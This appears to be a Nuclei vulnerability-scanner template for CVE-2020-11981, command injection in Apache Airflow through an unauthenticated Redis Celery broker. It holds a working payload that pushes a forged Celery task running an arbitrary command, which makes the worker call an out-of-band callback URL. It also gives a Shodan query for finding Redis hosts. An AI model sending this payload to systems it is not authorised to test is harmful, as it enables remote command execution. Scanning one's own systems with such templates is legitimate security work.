- id: CVE-2020-11981
  info:
    name: Apache Airflow <=1.10.10 - Command Injection
    author: pussycat0x
    severity: critical
    description: |
      An issue was found in Apache Airflow versions 1.10.10 and below. When using CeleryExecutor, if an attacker can connect to the broker (Redis, RabbitMQ) directly, it is possible to inject commands, resulting in the celery worker running arbitrary commands.
    reference:
      - https://github.com/apache/airflow/pull/9178
      - https://github.com/vulhub/vulhub/tree/master/airflow/CVE-2020-11981
    classification:
      cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
      cvss-score: 9.8
      cve-id: CVE-2020-11981
      cwe-id: CWE-78
      epss-score: 0.936930000
    metadata:
      max-request: 2
      shodan-query: product:"redis"
      verified: true
    tags: cve,cve2020,network,redis,unauth,apache,airflow,vulhub,intrusive
  variables:
    data: "*3\r\n$5\r\nLPUSH\r\n$7\r\ndefault\r\n$936\r\n{\"content-encoding\": \"utf-8\", \"properties\": {\"priority\": 0, \"delivery_tag\": \"{{delivery-tag}}\", \"delivery_mode\": 2, \"body_encoding\": \"base64\", \"correlation_id\": \"{{correlation-id}}\", \"delivery_info\": {\"routing_key\": \"celery\", \"exchange\": \"\"}, \"reply_to\": \"{{reply-to}}\"}, \"content-type\": \"application/json\", \"headers\": {\"retries\": 0, \"lang\": \"py\", \"argsrepr\": \"{{argsrepr}}\", \"expires\": null, \"task\": \"airflow.executors.celery_executor.execute_command\", \"kwargsrepr\": \"{}\", \"root_id\": \"{{root-id}}\", \"parent_id\": null, \"id\": \"{{task-id}}\", \"origin\": \"gen1@{{origin}}\", \"eta\": null, \"group\": null, \"timelimit\": [null, null]}, \"body\": \""
    encode1: '[[["{{command}}", "{{attack-url}}"]], {}, {"chain": null, "chord": null, "errbacks": null, "callbacks": null}]'
    end: '"}"'
  tcp:
    - inputs:
        - data: "{{data+base64(encode1)+concat(end+ '\r\n')}}"
          read: 1024
      host:
        - "{{Hostname}}"
        - "{{Host}}:{{Port}}"
      matchers-condition: and
      matchers:
        - type: word
          part: interactsh_protocol
          words:
            - "http"
        - type: word
          part: interactsh_request
          words:
            - "User-Agent: {{user-agent}}"
